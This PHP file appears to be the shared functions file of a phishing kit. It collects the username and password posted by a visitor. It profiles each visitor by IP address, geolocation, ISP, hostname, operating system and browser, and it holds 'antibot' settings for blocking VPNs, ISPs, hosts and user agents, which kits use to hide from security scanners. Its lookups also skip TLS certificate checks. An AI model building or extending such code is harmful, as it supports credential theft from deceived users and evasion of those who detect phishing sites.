<?php

function getTimeZoneFromIpAddress() {
    $ip = get_client_ip();
    
    // Get IP details from geoplugin
    $details = get_ip1($ip);
    $details = json_decode($details, true);
    
    if (isset($details['geoplugin_latitude']) && isset($details['geoplugin_longitude']) && 
        is_numeric($details['geoplugin_latitude']) && is_numeric($details['geoplugin_longitude'])) {
        $lat = (float)$details['geoplugin_latitude'];
        $lng = (float)$details['geoplugin_longitude'];
        $country_code = isset($details['geoplugin_countryCode']) ? $details['geoplugin_countryCode'] : '';
        
        $timezone = get_nearest_timezone($lat, $lng, $country_code);
        return array($timezone, $lat, $lng);
    }
    
    // Fallback to extreme-ip-lookup
    $details2 = get_ip2($ip);
    $details2 = json_decode($details2, true);
    
    if (isset($details2['lat']) && isset($details2['lon']) && 
        is_numeric($details2['lat']) && is_numeric($details2['lon'])) {
        $lat = (float)$details2['lat'];
        $lng = (float)$details2['lon'];
        $country_code = isset($details2['countryCode']) ? $details2['countryCode'] : '';
        
        $timezone = get_nearest_timezone($lat, $lng, $country_code);
        return array($timezone, $lat, $lng);
    }
    
    // Default fallback
    return array('UTC', 0, 0);
}

$array = getTimeZoneFromIpAddress();

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function get_nearest_timezone($cur_lat, $cur_long, $country_code = '') {
    // Validate input parameters
    if (!is_numeric($cur_lat) || !is_numeric($cur_long)) {
        return 'UTC';
    }
    
    $cur_lat = (float)$cur_lat;
    $cur_long = (float)$cur_long;
    
    $timezone_ids = ($country_code) ? DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY, $country_code)
        : DateTimeZone::listIdentifiers();

    if($timezone_ids && is_array($timezone_ids) && isset($timezone_ids[0])) {

        $time_zone = '';
        $tz_distance = 0;

        //only one identifier?
        if (count($timezone_ids) == 1) {
            $time_zone = $timezone_ids[0];
        } else {

            foreach($timezone_ids as $timezone_id) {
                try {
                    $timezone = new DateTimeZone($timezone_id);
                    $location = $timezone->getLocation();
                    $tz_lat   = $location['latitude'];
                    $tz_long  = $location['longitude'];

                    $theta    = $cur_long - $tz_long;
                    $distance = (sin(deg2rad($cur_lat)) * sin(deg2rad($tz_lat)))
                        + (cos(deg2rad($cur_lat)) * cos(deg2rad($tz_lat)) * cos(deg2rad($theta)));
                    $distance = acos($distance);
                    $distance = abs(rad2deg($distance));
                    // echo '<br />'.$timezone_id.' '.$distance;

                    if (!$time_zone || $tz_distance > $distance) {
                        $time_zone   = $timezone_id;
                        $tz_distance = $distance;
                    }
                } catch (Exception $e) {
                    // Skip invalid timezone
                    continue;
                }

            }
        }
        return $time_zone;
    }
    return 'UTC';
}

$IP = get_client_ip();

function get_ip1($ip2) {
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

function get_ip2($ip) {
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

function ISP($ip){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://ip-api.com/json/'.$ip.'');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
	$headers = array();
	$headers[] = 'Connection: keep-alive';
	$headers[] = 'Cache-Control: max-age=0';
	$headers[] = 'Upgrade-Insecure-Requests: 1';
	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36';
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
	$headers[] = 'Accept-Encoding: gzip, deflate';
	$headers[] = 'Accept-Language: ar,en-US;q=0.9,en;q=0.8,de;q=0.7';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	$result = curl_exec($ch);
	$js = json_decode($result,TRUE);
	$isp = isset($js['isp']) ? $js['isp'] : 'Unknown ISP';
	return $isp;
}


function getOS($useragent) {
  $os_platform = "Unknown OS Platform";
  $os_array = array('/windows nt 10/i' => 'Windows 10','/windows nt 6.3/i' => 'Windows 8.1','/windows nt 6.2/i' => 'Windows 8','/windows nt 6.1/i' => 'Windows 7','/windows nt 6.0/i' => 'Windows Vista','/windows nt 5.2/i' => 'Windows Server 2003/XP x64','/windows nt 5.1/i' => 'Windows XP','/windows xp/i' => 'Windows XP','/windows nt 5.0/i' => 'Windows 2000','/windows me/i' => 'Windows ME','/win98/i' => 'Windows 98','/win95/i' => 'Windows 95','/win16/i' => 'Windows 3.11','/macintosh|mac os x/i' => 'Mac OS X','/mac_powerpc/i' => 'Mac OS 9','/linux/i' => 'Linux','/ubuntu/i' => 'Ubuntu','/iphone/i' => 'iPhone','/ipod/i' => 'iPod','/ipad/i' =>  'iPad','/android/i' => 'Android','/blackberry/i' =>  'BlackBerry','/webos/i' => 'Mobile');
  foreach ($os_array as $regex => $value) {
    if (preg_match($regex, $useragent)) {
      $os_platform = $value;
    }
  }
  return $os_platform;
}

function getBrowser($useragent) {
    $browser = "Unknown Browser";
    $browser_array = array('/msie/i' => 'Internet Explorer','/firefox/i' => 'Firefox','/safari/i' => 'Safari','/chrome/i' => 'Chrome','/opera/i' => 'Opera','/netscape/i' => 'Netscape','/maxthon/i' => 'Maxthon','/konqueror/i' => 'Konqueror','/mobile/i' => 'Handheld Browser');
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}




# Variable Section

$details = get_ip1($IP);
$details = json_decode($details, true);

// Initialize variables with default values
$countryname = "";
$countrycode = "";
$continent = "";
$city = "";
$currency = "";
$regioncity = "";
$ipv6 = "";

// Extract data from first API
if (isset($details['geoplugin_countryName'])) {
    $countryname = $details['geoplugin_countryName'];
    $countrycode = $details['geoplugin_countryCode'];
    $continent = $details['geoplugin_continentName'];
    $city = $details['geoplugin_city'];
    $currency = $details['geoplugin_currencyCode'];
}

// Fallback to second API if first one didn't provide data
if($countryname == "") {
    $details2 = get_ip2($IP);
    $details2 = json_decode($details2, true);
    if (isset($details2['country'])) {
        $countryname = $details2['country'];
        $countrycode = $details2['countryCode'];
        $continent = $details2['continent'];
        $city = $details2['city'];
    }
}

$username = isset($_POST['user']) ? $_POST['user'] : "";
$password = isset($_POST['password']) ? $_POST['password'] : "";
$hostname = gethostbyaddr($IP);
if ($ipv6 == ""){
  $IPV6 = "N/A";
} else {
  $IPV6 = $ipv6;
}
$useragent = $_SERVER['HTTP_USER_AGENT'];
$timezone = $array[0];
$date = date("h:i:s d/m/Y");
$os = getOS($useragent);
$browser = getBrowser($useragent);

// Add missing variables for antibot compatibility
$ip = $IP; // Make $ip available for antibot files
$dp = strtolower($useragent); // User agent in lowercase for AntiBotThree.php

// Block settings - set to "on" to enable blocking, "off" to disable
$block_vpn = "off";    // Enable VPN blocking
$block_isp = "off";    // Enable ISP blocking  
$block_host = "off";   // Enable hostname blocking
$block_ua = "off";     // Enable user agent blocking

// Function to get IP address (for compatibility with antibot files)
function getIP() {
    return get_client_ip();
}

// Alias for getIP (case-insensitive)
if (!function_exists('getIp')) {
    function getIp() {
        return get_client_ip();
    }
}

/**
 * Get the correct path to redirects.json file (cross-platform)
 * @return string|null Path to redirects.json or null if not found
 */
function get_redirects_file_path() {
    // Try multiple path resolutions for cross-platform compatibility
    $possible_paths = [
        __DIR__ . DIRECTORY_SEPARATOR . 'redirects.json',  // session/redirects.json (when called from session/function.php)
        dirname(__DIR__) . DIRECTORY_SEPARATOR . 'session' . DIRECTORY_SEPARATOR . 'redirects.json',  // From root
        __DIR__ . '/redirects.json',  // Unix style
        dirname(__DIR__) . '/session/redirects.json',  // Unix style from root
    ];
    
    foreach ($possible_paths as $path) {
        $normalized_path = str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $path);
        if (file_exists($normalized_path) && is_readable($normalized_path)) {
            return $normalized_path;
        }
    }
    
    return null;
}

/**
 * Restore username from redirects.json if it exists
 * DISABLED: No longer restoring usernames for clean redirect flow
 * This function is kept for backward compatibility but does nothing
 */
function restore_username_from_redirects() {
    // Function disabled - no username restoration
    // Username should be set fresh on each page that needs it
    return;
}
?>